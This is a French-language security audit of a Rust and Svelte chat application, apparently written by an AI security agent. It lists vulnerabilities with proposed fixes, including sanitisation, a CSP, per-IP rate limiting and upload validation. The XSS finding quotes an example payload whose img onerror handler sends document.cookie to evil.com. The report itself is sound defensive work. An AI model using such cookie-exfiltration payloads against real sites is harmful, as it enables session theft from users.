# 🛡️ Rapport d'Audit Sécurité — Nook v0.4.0-beta.1

> **Session 35** | Analyse statique du code source (backend Rust + frontend Svelte)
> Auteur : Agent Sécurité | Portée : auth, upload, WS, DB, frontend XSS/CSP

---

## 🔴 Vulnérabilités critiques

### [SEC-01] XSS via `{@html}` dans le chat — CRITIQUE

**Fichier** : `frontend/src/routes/chat/+page.svelte` ligne 570
```svelte
<div class="message-content">{@html msg.content}</div>
```

**Problème** : Le contenu des messages est rendu comme HTML brut sans aucune sanitisation.
Tout utilisateur peut envoyer un message contenant `<script>alert(1)</script>` ou
`<img src=x onerror="fetch('https://evil.com?t='+document.cookie)">`.

**Impact** : Vol de session (même si le cookie est HttpOnly, le token est aussi dans les
headers WS récupérables), phishing interne, exfiltration de données, redirection.

**Fix requis (deux étapes)** :

1. Ajouter `DOMPurify` côté frontend :
```typescript
// frontend/src/lib/sanitize.ts
import DOMPurify from 'dompurify';

const ALLOWED_TAGS = ['b', 'i', 'em', 'strong', 'a', 'br', 'img', 'span'];
const ALLOWED_ATTR = ['href', 'src', 'alt', 'class', 'loading', 'target'];

export function sanitize(html: string): string {
  return DOMPurify.sanitize(html, {
    ALLOWED_TAGS,
    ALLOWED_ATTR,
    ALLOW_DATA_ATTR: false,
    FORCE_HTTPS_FOR_LINKS: true,
  });
}
```

```svelte
<!-- Dans chat/+page.svelte -->
<script>
  import { sanitize } from '$lib/sanitize';
</script>
<div class="message-content">{@html sanitize(msg.content)}</div>
```

2. Ajouter une Content-Security-Policy dans `app.html` :
```html
<meta http-equiv="Content-Security-Policy"
  content="default-src 'self'; script-src 'self'; img-src 'self' https://media.tenor.com data: blob:; connect-src 'self' wss:; style-src 'self' 'unsafe-inline'; font-src 'self';" />
```

**Dépendance à ajouter** :
```
npm install dompurify
npm install --save-dev @types/dompurify
```

---

### [SEC-02] Rate limiting global (non par IP) — HAUTE

**Fichier** : `backend/src/main.rs` ligne 132
```rust
type AuthRateLimiter = RateLimiter<NotKeyed, InMemoryState, DefaultClock, NoOpMiddleware>;
// Quota : 10 requêtes / 60 secondes par processus (shared global, pas par IP)
```

**Problème** : Le rate limiter est `NotKeyed` — il compte toutes les requêtes sur toutes les
IPs confondues. Si 5 utilisateurs légitimes font 2 requêtes chacun simultanément, le 6ème
est bloqué. À l'inverse, un attaquant peut pré-épuiser le quota pour bloquer les autres
avant son attaque.

**Impact** : DoS involontaire pour les utilisateurs légitimes + protection insuffisante contre
le brute-force depuis une seule IP.

**Fix recommandé** : Rate limiting par IP avec `governor` keyed :
```rust
use governor::state::{keyed::DefaultKeyedStateStore, KeyedRateLimiter};
use std::net::IpAddr;

type IpRateLimiter = KeyedRateLimiter<IpAddr, DefaultKeyedStateStore<IpAddr>, DefaultClock>;

// Dans le middleware :
async fn rate_limit_by_ip(
    ConnectInfo(addr): ConnectInfo<SocketAddr>,
    State(limiter): State<Arc<IpRateLimiter>>,
    req: Request<Body>,
    next: Next,
) -> Response {
    match limiter.check_key(&addr.ip()) {
        Ok(_) => next.run(req).await,
        Err(_) => StatusCode::TOO_MANY_REQUESTS.into_response(),
    }
}
```

**Note** : En attendant le fix, le quota actuel de 10/min est suffisant en contexte familial
(~5 utilisateurs). Le risque réel est faible mais la protection est théoriquement incorrecte.

---

## 🟡 Vulnérabilités moyennes

### [SEC-03] Token de session : entropy ok mais pas de rotation — MOYENNE

**Fichier** : `backend/src/auth.rs` lignes 158, 269
```rust
let token = Uuid::new_v4().to_string();
```

**Analyse** :
- UUID v4 = 122 bits d'entropie aléatoire → suffisant, non prédictible
- Générés via `uuid` crate qui utilise l'OS RNG → sécurisé
- ✅ Stocké en DB, révocable au logout
- ⚠️ Pas de rotation automatique (même token pendant 24h)
- ⚠️ Comparaison côté DB `WHERE token = ?` → SQLite fait une comparaison de string → potentiel timing attack au niveau DB (faible risque car réseau local)

**Recommandation optionnelle** : remplacer UUID par `rand_core::OsRng` + `base64` pour 32 bytes explicitement :
```rust
use rand_core::{OsRng, RngCore};
use base64ct::{Base64Url, Encoding};

fn generate_session_token() -> String {
    let mut bytes = [0u8; 32];
    OsRng.fill_bytes(&mut bytes);
    Base64Url::encode_string(&bytes)
}
```
→ 256 bits d'entropie, URL-safe, lisible dans les logs.

---

### [SEC-04] Pas de validation du Content-Type des uploads — MOYENNE

**Fichier** : `backend/src/upload.rs`

**Problème** : Le Content-Type est lu depuis le multipart (non fiable — contrôlé par le client).
Un fichier `.php` ou `.html` peut être uploadé avec `content_type: "image/jpeg"`.
Les fichiers sont chiffrés et non exécutés directement, ce qui limite le risque,
mais un fichier malveillant peut être téléchargé et exécuté par un autre utilisateur.

**Fix recommandé** : Validation par magic bytes (les 4-8 premiers octets du fichier) :
```rust
fn validate_file_type(data: &[u8], claimed_type: &str) -> bool {
    // JPEG: FF D8 FF
    // PNG:  89 50 4E 47
    // GIF:  47 49 46 38
    // PDF:  25 50 44 46
    // WebP: 52 49 46 46 xx xx xx xx 57 45 42 50
    let magic = &data[..data.len().min(12)];
    match claimed_type {
        t if t.starts_with("image/jpeg") => magic.starts_with(&[0xFF, 0xD8, 0xFF]),
        t if t.starts_with("image/png")  => magic.starts_with(&[0x89, 0x50, 0x4E, 0x47]),
        t if t.starts_with("image/gif")  => magic.starts_with(b"GIF8"),
        t if t.starts_with("application/pdf") => magic.starts_with(b"%PDF"),
        _ => true, // permissif pour les autres types
    }
}
```

---

### [SEC-05] Pas de limite de taille sur les messages WebSocket — MOYENNE

**Fichier** : `backend/src/webrtc.rs`

**Problème** : Le handler WS traite tous les messages sans limite de taille.
Un message de signaling de 100 MB serait accepté et traité (serde::from_str).

**Fix** :
```rust
Ok(axum::extract::ws::Message::Text(text)) => {
    // Limite de 64 KB sur les messages de signaling
    if text.len() > 65_536 {
        tracing::warn!("Message WS trop volumineux: {} bytes, déconnexion", text.len());
        break;
    }
    // ... suite du traitement
}
```

---

### [SEC-06] `emergency.rs` non connecté mais présent — INFORMATIONNEL

**Fichier** : `backend/src/emergency.rs`

Le module existe mais n'est pas importé dans `main.rs` (aucun `mod emergency;`).
Le handler `handle_emergency` n'est donc **pas exposé** → pas de risque immédiat.

**Attention** : Si ce module est connecté dans le futur sans authentification
(comme son implémentation actuelle le suggère — pas de `CurrentUser`), il créera
un endpoint non authentifié pouvant être spammé.

**Recommandation** : Avant d'activer ce module, ajouter `require_auth` et un
rate limiting strict (1 requête / 10 minutes par utilisateur).

---

## 🟢 Points positifs confirmés

| Contrôle | État | Détail |
|---|---|---|
| Cookie HttpOnly | ✅ | `auth_token` inaccessible depuis JS |
| SameSite adaptatif | ✅ | `Lax` en HTTP/LAN, `None;Secure` en HTTPS/WAN |
| Argon2id passwords | ✅ | `rand_core::OsRng`, sel généré correctement |
| Tokens révocables | ✅ | `token = NULL` en DB au logout |
| Requêtes paramétrées | ✅ | sqlx bind partout — zéro SQL injection possible |
| Auth WS vérifiée | ✅ | `verify_ws_auth()` à la connexion WS |
| Fichiers chiffrés | ✅ | XChaCha20-Poly1305 à l'upload |
| Max 50 Mo upload | ✅ | Vérifié côté serveur (`validate()`) |
| CORS strict | ✅ | Origins explicites, pas de wildcard avec credentials |
| Admin role check | ✅ | Middleware `require_admin` séparé de `require_auth` |
| Pas de données sensibles dans logs | ✅ | Aucun password/token dans tracing:: |
| `conversation_participants` vérifié | ✅ | `WHERE cp.user_id = ?` sur les lectures messages |
| TTL fichiers 48h | ✅ | `prune.rs` + `cleanup.rs` |

---

## 📋 Plan de remédiation priorisé

| # | Vulnérabilité | Effort | Impact | Session cible |
|---|---|---|---|---|
| 1 | [SEC-01] XSS `{@html}` | 2h | Critique | **S35 immédiat** |
| 2 | [SEC-01b] CSP dans app.html | 30min | Haute | **S35 immédiat** |
| 3 | [SEC-04] Magic bytes upload | 3h | Moyenne | S36 |
| 4 | [SEC-05] WS message size | 30min | Moyenne | S36 |
| 5 | [SEC-03] Token 256 bits | 1h | Faible | S37 |
| 6 | [SEC-02] Rate limit par IP | 4h | Faible en contexte familial | S38 |
| 7 | [SEC-06] Emergency module auth | 1h | Avant activation | Avant S36 si activé |


### Session 48 — 2026-04-08
- NotificationToast.svelte: aucun risque XSS (contenu échappé par Svelte)
- notificationStore.svelte.ts: AudioContext sandboxé, pas d'accès réseau
- Pas de nouvelles vulnérabilités introduites
